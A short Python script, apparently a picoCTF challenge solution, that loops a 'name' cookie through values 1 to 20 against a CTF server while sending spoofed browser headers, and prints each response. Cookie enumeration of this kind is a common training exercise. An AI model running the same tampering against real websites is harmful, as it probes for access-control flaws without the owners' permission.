import requests

url = 'http://mercury.picoctf.net:27177/check'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://mercury.picoctf.net:27177/',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

for i in range(1, 21):
    cookies = {'name': str(i)}
    response = requests.get(url, headers=headers, cookies=cookies)
    print(f'Response for name={i}: {response.text}')
